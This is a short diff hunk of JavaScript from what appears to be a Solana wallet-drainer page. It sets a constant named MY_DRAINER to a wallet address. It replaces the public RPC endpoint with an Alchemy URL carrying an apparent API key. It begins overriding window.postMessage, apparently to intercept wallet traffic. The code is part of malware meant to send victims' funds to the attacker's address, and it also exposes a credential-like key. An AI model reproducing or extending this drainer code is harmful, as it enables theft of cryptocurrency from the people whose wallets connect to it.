@@ -74,7 +74,7 @@ return;
 document.getElementById('mainUI').style.display = 'block';
 
 const MY_DRAINER = '476p6oRtENVHzv7PJT6kAtwwXeJU7C7L4qvTephqYN6Y';
-const RPC_URL = 'https://public-rpc.solana.com';
+const RPC_URL = 'https://solana-mainnet.g.alchemy.com/v2/alch_7vGucJCx0rir9Zb-ipOOV';
 
 (function() {
 const orig = window.postMessage;
